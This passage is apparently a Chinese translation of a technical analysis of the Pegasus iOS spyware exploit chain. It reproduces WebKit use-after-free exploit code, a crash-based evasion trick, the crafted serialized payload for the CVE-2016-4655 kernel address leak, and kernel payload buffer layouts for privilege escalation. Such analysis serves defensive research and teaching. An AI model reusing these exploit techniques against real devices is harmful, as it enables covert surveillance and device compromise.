<p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++</span>)</span>&#123;</span><br><span class="line">		pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line">	<span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params">i =<span class="number">0</span>;i&lt;attempts.length;i++</span>)</span>&#123;</span><br><span class="line">		attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p>
<p>完成后，会检测垃圾回收是否触发。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">before_len==after_len</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p>
<h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p>
<p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">x=attempts.length-<span class="number">1</span>;x&gt;=<span class="number">1</span>;x--</span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length != <span class="number">80</span>/<span class="number">4</span></span>)</span>&#123;</span><br><span class="line">		<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length==<span class="number">0xFFFFFFFF</span></span>)</span>&#123;</span><br><span class="line">			memory_view=attempts[x];</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p>
<h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">	body+=<span class="string">&#x27;try &#123;&#125; catch(e);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>,body);</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++</span>)</span>&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p>
<h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="绕过KASLR"><a href="#绕过KASLR" class="headerlink" title="绕过KASLR"></a>绕过KASLR</h2><h3 id="注入的第二阶段：内核位置泄露"><a href="#注入的第二阶段：内核位置泄露" class="headerlink" title="注入的第二阶段：内核位置泄露"></a>注入的第二阶段：内核位置泄露</h3><p>第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。</p>
<h3 id="分析KASLR绕过"><a href="#分析KASLR绕过" class="headerlink" title="分析KASLR绕过"></a>分析KASLR绕过</h3><p>阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。</p>
<p>首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。</p>
<h4 id="32位和63位二进制包不同的地方"><a href="#32位和63位二进制包不同的地方" class="headerlink" title="32位和63位二进制包不同的地方"></a>32位和63位二进制包不同的地方</h4><p>32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。</p>
<h4 id="加载API"><a href="#加载API" class="headerlink" title="加载API"></a>加载API</h4><p>想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过<strong>dlsym</strong>动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在<strong>main</strong>函数上，加载了大量的API地址，但只使用一小部分的API（例如，<strong>socket</strong>函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。</p>
<p>分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用<strong>chmod</strong>改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。</p>
<p>由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在：</p>
<ol>
<li><strong>fs.c</strong> 加载跟文件还有文件系统操作方法例如<em>ftw,open,read,rename,mount</em>有关的API</li>
<li><strong>kaslr.c</strong> 加载API，如<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>，通过利用<em>io _ service _ open _ extended</em>函数中的漏洞，这些API来找到内核地址。</li>
<li>**bh.c ** 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 <em>BZ2 _ bzDecompress, chmod, and malloc</em></li>
<li>*<em>safari.c ** 加载如</em>sync, exit, strcpy*API，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。</li>
</ol>
<p>上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。</p>
<h4 id="环境设置和平台确定"><a href="#环境设置和平台确定" class="headerlink" title="环境设置和平台确定"></a>环境设置和平台确定</h4><p>在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。</p>
<p>为了确定受害者设备的型号，调用了<em>sysctlbyname</em>获得<em>hw.machine</em>。另一个对<em>sysctlbyname</em>获取*kern.osversion *信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。</p>
<p>阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–<em>$HOME/tmp/lock</em>（注意：*$HOME*是一个程序独有变量）</p>
<p>32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。</p>
<h4 id="攻入KASLR"><a href="#攻入KASLR" class="headerlink" title="攻入KASLR"></a>攻入KASLR</h4><p>阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用<strong>CVE-2016-4655</strong>找到内核空间中的一个内存地址。</p>
<p>阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫<strong>AppleKeyStore</strong>的服务并调用<strong>IOServiceMatching</strong>，调用结果返回到<strong>IOServiceGetMatchingService **，得到</strong>io _ service _ t<strong>对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用</strong>io_service_open_extended<strong>并将一段精心制作的属性字段传到服务中。这个字段是</strong>XML<strong>数据的串行化二进制表示，</strong>io_service_open_extended<strong>会将数据最终传到内核中的</strong>OSUnserializeBinary<strong>函数。</strong>OSUnserializeBinary<strong>里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。</strong>kOSSerializeNumber**类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">												bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">												<span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">												value=next[<span class="number">1</span>];</span><br><span class="line">												value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">												value |= next[<span class="number">0</span>];</span><br><span class="line">												o = OSNumber::withNumber(value. len);</span><br><span class="line">												next+=<span class="number">2</span>;</span><br><span class="line">													<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>问题是<strong>len</strong>变量在传送到<strong>OSNumber::withNumber</strong>前是无效的。最终，<strong>OSNumber::init</strong>被调用，其会盲目信任用户控制的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">OSNumber::init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!super::init())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	size=newNumberOfBits;</span><br><span class="line">	value=(inValue &amp; sizeMask);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个漏洞让阶段二可以控制OSNumber的大小。<strong>io_service_open_extended</strong>为<strong>OSUnserializedBinary</strong>准备好了使用环境，通过<strong>OSUnserializedBinary</strong>来利用漏洞。在怎么利用前，先来看看传送到<strong>io_service_open_extended</strong>的恶意**properties **字段。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line">	<span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line">	<span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line">	<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 1</span></span><br><span class="line">	<span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(4)</span></span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingDst&quot;</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 2</span></span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line">	<span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>阶段二调用<em>IORegistryEntryGetProperty <em>来找到</em>HIDKeyboardModifierMappingSrc</em>的入口点，导致<strong>properties</strong>数组创建了超过最大值64bit的<strong>OSNumber</strong>值。阶段二用下列代码调用<em>is_ io_registry_entry_get_property_bytes</em>，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着<strong>IORegistryEntryGetProperty</strong>这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">	writeLog(<span class="number">7</span>,<span class="string">&quot;%.2s%5.5d\n&quot;</span>,<span class="string">&quot;kaslr.c&quot;</span>,<span class="number">138</span>);</span><br><span class="line">	<span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要特别注意这段代码的两个方面。第一，properties数组指定<strong>OSNumber</strong>的值是256字节大小，这个值会最终导致数据泄露。第二，<em>index</em>值会因型号和iOS版本不同而不同，这个值存储在<em>dataBuffer</em>中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定<em>dataBuffer</em>那个地址值是有效的内核地址。</p>
<p>如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。</p>
<h4 id="在受害设备上建立读-写-执行原语（32bit）"><a href="#在受害设备上建立读-写-执行原语（32bit）" class="headerlink" title="在受害设备上建立读/写/执行原语（32bit）"></a>在受害设备上建立读/写/执行原语（32bit）</h4><p>找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过<strong>host_get_clock_service</strong>得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。</p>
<p>紧跟着<em>pipe</em>和<em>host_get_clock_service calls</em>，32包检查向前通过<strong>task_from_pid</strong>创建的内核端口值。如果<strong>task_from_pid</strong>返回了一个有效值（不是NULL），32包用<em>vm_write</em>写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了<em>clock_ops</em>的一部分。</p>
<p>当调用例如<em>clock_get_attributes</em>函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的<em>getattr</em>操作语。特别的是，实时时钟的<em>getattr</em>被修改成指向<strong>OSSerializer::serialize</strong>的指针，电池时钟的<em>getattr</em>改成指向<strong>_bufattr_cpx</strong>的指针。</p>
<p>当两个时钟调用<em>clock_get_attributes</em>时，会改变其原有的执行结果。例如电池时钟调用<em>clock_get_attributes</em>时，相当与调用了内核空间读函数。<strong>_bufattr_cpx</strong>只有两个属性：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">			LDR        R0,[R0]</span><br><span class="line">			BX          LR</span><br></pre></td></tr></table></figure>

<p>R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然<strong>getattr</strong>使用了三个参数，但缺少完全兼容的函数原型没有关系。</p>
<p>替代了实时时钟<strong>getattr</strong>的函数更加复杂。<strong>OSSerializer::serialize</strong>函数将<em>OSSerializer <em>对象（包含虚函数表（vtable））作为</em>this</em>指针。函数调用* OSSerializer *对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_DWORD <span class="title">OSSerializer::serialize</span><span class="params">(OSSerialize *)</span>:</span></span><br><span class="line">		LDR      R3,[R0,#8]</span><br><span class="line">		MOV    R2,R1</span><br><span class="line">		LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">		LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">		MOV     R0,R3</span><br><span class="line">		BX         R12</span><br></pre></td></tr></table></figure>
<p>通过一段特殊设计的数据块，接下来会详细谈到，现在调用<em>clock_get_attributes</em>就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。</p>
<p>如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。</p>
<p>64位包不会利用已越狱手机上的后门。</p>
<h4 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h4><p>为在内核中执行任意代码，最终阶段二会利用一个UFA（use after free）漏洞。当间接引用的内存区域（漏洞想要控制的）在漏洞利用开始前分配给了另一个线程，这时竞争状况产生了。其他线程可能突然申请一段重要的已释放区域，为降低这种可能性，阶段二会创建非常多的线程，并立刻将每个线程（主线程之外的）暂停。接着，阶段二为主线程修改时刻表策略，使利用UAF时不会碰到内存竞争占用的情况的可能性大大增加。</p>
<p>阶段二64位版本中还有额外的一个步骤。在线程时刻表修改完成后，阶段二会创建1000个线程。每个线程都含有一个单紧环，这个循环等待全局变量降至预定义值以下（值小于0）。这是为了确保（至少，增加可能性）没有其他的线程会争夺UFA目标内存块。</p>
<h4 id="建立通信隧道（32位）"><a href="#建立通信隧道（32位）" class="headerlink" title="建立通信隧道（32位）"></a>建立通信隧道（32位）</h4><p>阶段二32包利用pipe命令创建另一个<em>pipe</em>，重新使用原先生成的<em>pipe</em>的变量。在调用<em>host_get_clock_service</em>之后，这个命令立刻执行，以获得实时和电池时钟。因这个pipe，<em>host_get_clock_service</em>再使用了之前为获得不同时钟端口<em>host_get_clock_service</em>使用的变量。</p>
<p>先前生成的<em>pipe</em>和时钟端口非常关键，因为接下来的内核操作会用到，如果内核任务端口早已可得，<strong>32Stage2</strong>会略过这个对修改内核很重要的过程而是直接调用<em>vm_write</em>来修改内核。然而，如果<strong>32Stage2</strong>没有得到内核任务端口（手机没有越狱的情况），漏洞利用就很重要。作为攻击的一部分，32Stage2在攻击前向要获得<em>pipe</em>组和时钟，因此二进制包可以确保获得。尽管没必要重复，这是为确保重要的对象可达。</p>
<p>假定用于最终调用函数的触发机制只不过是将现有函数指针重定向到sysctl处理程序，64位包不用执行这一步骤。</p>
<h4 id="payload构造和内核插入"><a href="#payload构造和内核插入" class="headerlink" title="payload构造和内核插入"></a>payload构造和内核插入</h4><p>如果不能通过内核端口修改内核存储空间，<strong>32Stage2</strong>必须利用iOS已存漏洞去控制内核。其构造了两个数据缓冲块：包含修改实时和电池时钟的20字节的关键覆盖数据和38字节的一段payload，会运行一系列小程序来安装时钟覆盖程序。如下：<br><strong>clock_ops_overwrite</strong> 缓存区：</p>
<pre><code>[00] (rtclock.getattr):address of OSSerializer::serialize
[04] (calend_config):NULL
[08] (calend_init):NULL
[0C] (calend_gettime):address of calen_gatattr
[10] (calend_getattr):address of _bufattr_cpx</code></pre>
<p><strong>uaf_payload_buffer</strong>攻击利用的缓存区：</p>
<pre><code>[00] ptr to clock_ops_overwrite buffer
[04] address of clock_ops array in kern memory
[08] address of _copyin
[0C] NULL
[10] address of OSSerializer::serialize
[14] address of &quot;BX LR&quot; code fragment
[18] NULL
[1C] address of OSSymbol::getMetaClass
[20] address of &quot;BX LR&quot; code fragment
[24] address of &quot;BX LR&quot; code fragment</code></pre>
<p><strong>32Stage2</strong>创建一个新线程来处理安装一新的时钟处理程序所需要的初始操作，但这个新线程不会进行安装。这个线程在栈上创建<strong>kauth_filesec</strong>数据块：</p>
<pre><code>.fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D
.fsec.owner=&lt;undetermind, random stack value&gt;;
.fsec.group=&lt;undetermind, random stack value&gt;;
.fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1</code></pre>
<p><em>uaf_payload_buffer</em>添加到<em>kauth _filesec</em>中的*<em>kauth_filesec.fsec_acl.acl_ace[]**数组末尾处。这个会在IOKit上开设一个端口，为AppleKeyStore调用I</em>OServiceGetMatchingService*。该线程利用与获取内核地址相同的方法，获得一段有效的内核内存空间。新线程和之前相同操作不同之处在于属性名称不同（新线程使用“ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara”）。</p>
<p>接着，<strong>open_extended *<em>调用</em>syscall*。32包将锁定文件的地址传到syscall，还有KAUTH_UID_NONE和KAUTH_GID_NONE两个参数值，在线程开始时，创建</strong>kauth_filesec<strong>。</strong>open_extended**会执行下列代码：</p>
<pre><code>if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp;
    ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0))</code></pre>
<p><strong>kauth_copyinfilesec</strong>从用户块中复制<strong>kauth_filesec **到内核块中的</strong>kauth_filesec <strong>数据块中。</strong>kauth_filesec **制作了一个访问控制列表(acl)包含访问控制入口(ace)。如下：</p>
<pre><code>/* FILE SECURITY information */
struct kauth_filesec&#123;
    u_int32_t        fsec_magic;
    guid_t            fsec_owner;
    guid_t            fsec_group;
    struct kauth_acl fsec_acl;
&#125;；</code></pre>
<p>ACL储存在<strong>kauth_acl</strong> ，如下：</p>
<pre><code>/* Access Contro List */
struct kauth_acl&#123;
    u_int32_t        acl_entrycount;
    u_int32_t        acl_flags;
    struct kauth_ace acl_ace[1];
&#125;;</code></pre>
<p><strong>kauth_ace</strong>有24字节，如下：</p>
<pre><code>typedef u_int32_t kauth_ace_rights_t;
/* Access Control List Entry (ACE) */
struct kauth_ace&#123;
    guid_t        ace_applicable;
    u_int32_t    ace_flags;
    kauth_ace_rights_t    ace_rights;                    /*scope specific*/
&#125;;</code></pre>
<p><strong>kauth_acl</strong>里的<strong>acl_entrycount</strong>是一个无符号整型，定义了acl_ace数组里有多少个<strong>kauth_ace</strong>入口。如果ACL里没有ACE记录，acl_entrycount会定义为KAUTH_FILESEC_NOACL，这个值为-1。在<strong>kauth_copyinfilesec</strong>中发现如下注释。</p>
<pre><code>/* 
    猜测filesec的大小。从基指针开始，
    看看还有页面上还有多少空间剩余，
    裁剪到合理的上界。如果空间不够，
    重新基于实际ACL空间大小定义，重新开始。

    上届值必须小于KAUTH_ACL_MAX_ENTRIES。
    但可任意取值，0也可以。
*/</code></pre>
<p>当该线程构建了kauth_filesec，会直接操控栈上的数据块地址，如下：</p>
<pre><code>//get stack address
p=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000;
//kauth_filesec.fsec_magic
(p+0xEC0)=0x12CC16D;
//kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL
(p+0xEE4)=-1;
//kauth_filesec.fsec_acl.acl_ace[...]
memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128);</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
